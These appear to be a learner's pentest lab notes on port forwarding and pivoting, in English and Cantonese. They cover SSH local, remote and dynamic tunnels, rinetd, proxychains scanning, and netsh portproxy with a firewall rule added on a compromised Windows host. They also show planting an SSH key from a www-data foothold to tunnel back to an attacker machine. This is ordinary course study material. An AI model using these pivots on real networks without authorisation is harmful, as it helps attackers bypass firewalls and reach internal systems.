# Port Forwarding

## Windows

```
plink.exe
```

## Linux
```
-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24
ssh -f -N megan@10.1.1.27 -L 2049:127.0.0.1:2049 
sudo mount -o port=2049 127.0.0.1:/srv/Share mount
# RINETD   #拎kali做跳板  如果target無internet, 可以用我地kali做跳板,幫佢駁上網

sudo apt update && sudo apt install rinetd 
gedit /etc/rinetd.conf 
  
# bindadress bindport connectaddress connectport 
  0.0.0.0         80 	   216.58.207.142    80                                       將我地port 80 收到ge traffic 駁到去216.58.207.142 ge 80 (google.com)

sudo service rinetd restart 									姐係當一部machine nc 我地ip 80 個陣, 會上左google.com
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SSH local port forwarding   (無in&out restriction)

 sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128  #student@10.11.0.128係跳板幫我地駁去另一個network,192.168.1.110:445係target
我地做緊就係將我地local 445 ge traffic forward去 target ge 445 throguht 我地個跳板

run 之前要make sure /etc/samba/smb.conf 入面min protocol 係set做SMB2
跟住restart service sudo /etc/init.d/smbd restart
之後就可以smbclient -L 127.0.0.1 -U administrator 去scan target
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# SSH remote port forwarding (係target到run。 假設target有firewall filter 左 3306 inbound traffic , 我地唔可以直接係kali access 3306, 我地可以係target到set up tunnel,
等佢將我地ge request redirect 去3306再forward翻比我地

student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4  
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 #SSH dynamic port forwarding (無in&out restriction)  係ssh local port forwarding進化版, 唔再限死speicif ip同port, 用黎access 跳板可以access ge machines
 sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128    //dynamic

gedit /etc/proxychains.conf 
 [ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 8080 

sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110 
***SOCKS proxies require a TCP connection to be made and thus a half-open or SYN scan cannot be used with ProxyChains.
*** Since SOCKS proxies require a TCP connection, ICMP cannot get through either and we must disable pinging with the -Pn flag 
  
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
 ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@10.11.0.4 
  



 C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110 
 netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow 
如果pivot去445 要改 cat /etc/samba/smb.conf   min protocol = SMB2  將smb1變成smb2 跟住restart smb  sudo /etc/init.d/smbd restart 

www-data@debian:/$ ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1 
student@debian:~$  hts --forward-port localhost:8888 1234 
kali@kali:~$ htc --forward-port 8080 10.11.0.128:1234 
  
  ```
  - remote forwarding
```
mkdir keys
cd keys
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/keys/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /tmp/keys/id_rsa.
Your public key has been saved in /tmp/keys/id_rsa.pub.
...
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMf
LhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8Z
Io/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T
5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF
9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla 

 The final ~/.ssh/authorized_keys file on Kali can be found in Listing 897.
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",
no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA
AABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ
9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7k
Z1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9x
k87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MD
nin www-data@ajla 
  
 ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul
l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4 
```